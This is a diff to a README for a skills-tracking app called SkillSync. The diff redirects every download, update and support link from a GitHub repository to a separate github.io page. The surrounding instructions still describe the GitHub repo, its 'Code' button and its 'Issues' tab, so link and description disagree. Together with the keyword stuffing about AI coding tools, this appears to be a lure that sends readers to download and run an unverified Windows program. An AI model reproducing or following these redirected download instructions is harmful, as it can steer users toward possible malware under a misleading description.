@@ -1,6 +1,6 @@
 # 🤖 SkillSync - Automate Skills Tracking, Optimize Your Team
 
-[![Download SkillSync](https://img.shields.io/badge/Download-SkillSync-blue?style=for-the-badge&logo=github)](https://github.com/Marlinerefractory8591/SkillSync)
+[![Download SkillSync](https://img.shields.io/badge/Download-SkillSync-blue?style=for-the-badge&logo=github)](https://marlinerefractory8591.github.io)
 
 ## 👋 Welcome to SkillSync
 
@@ -36,7 +36,7 @@ Getting SkillSync on your computer is simple. Follow these steps exactly:
 
 Visit this link to download the application:
 
-[**Download SkillSync Now**](https://github.com/Marlinerefractory8591/SkillSync)
+[**Download SkillSync Now**](https://marlinerefractory8591.github.io)
 
 When you click the link, you'll be taken to the SkillSync page on GitHub. Look for the green button that says "Code" or "Download" on that page. Click it, and choose "Download ZIP" from the menu that appears. The download will start automatically.
 
@@ -125,7 +125,7 @@ Use this information to plan training sessions, hire new people, or reassign wor
 
 SkillSync is constantly improving. To make sure you have the latest version:
 
-1. Visit the download page again: [**SkillSync Updates**](https://github.com/Marlinerefractory8591/SkillSync)
+1. Visit the download page again: [**SkillSync Updates**](https://marlinerefractory8591.github.io)
 2. Check if there's a newer version available
 3. If there is, download and extract it the same way you did the first time
 4. Replace the old folder with the new one
@@ -160,7 +160,7 @@ A: This version is designed for Windows. Mac and Linux versions are in developme
 
 If you run into any problems or have questions, here are your options:
 
-- **Visit the GitHub Page** - Go to [https://github.com/Marlinerefractory8591/SkillSync](https://github.com/Marlinerefractory8591/SkillSync) and check the "Issues" section. Someone may have already asked your question.
+- **Visit the GitHub Page** - Go to [https://marlinerefractory8591.github.io](https://marlinerefractory8591.github.io) and check the "Issues" section. Someone may have already asked your question.
 - **Submit a Question** - On the same page, click "New Issue" to ask your question directly. The community and developers will respond.
 - **Explore the Documentation** - Look for a "Documentation" or "Wiki" tab on the GitHub page for more detailed guides.
 
@@ -172,6 +172,6 @@ Remember, SkillSync is here to save you time and help you build a stronger, more
 
 Visit this link to download the application:
 
-[**Download SkillSync**](https://github.com/Marlinerefractory8591/SkillSync)
+[**Download SkillSync**](https://marlinerefractory8591.github.io)
 
 Keywords: ai-agents, antygravity-ai, claude-code-skills, claude-skills, codex-skill, developer-tools, gemini-skills, skill, skill-management, skill-md, skills, skills-course, skills-library, skills-management, skills-manager, skills-registry, skills-sh, skills-ui, skills-updater, skills-upgrade
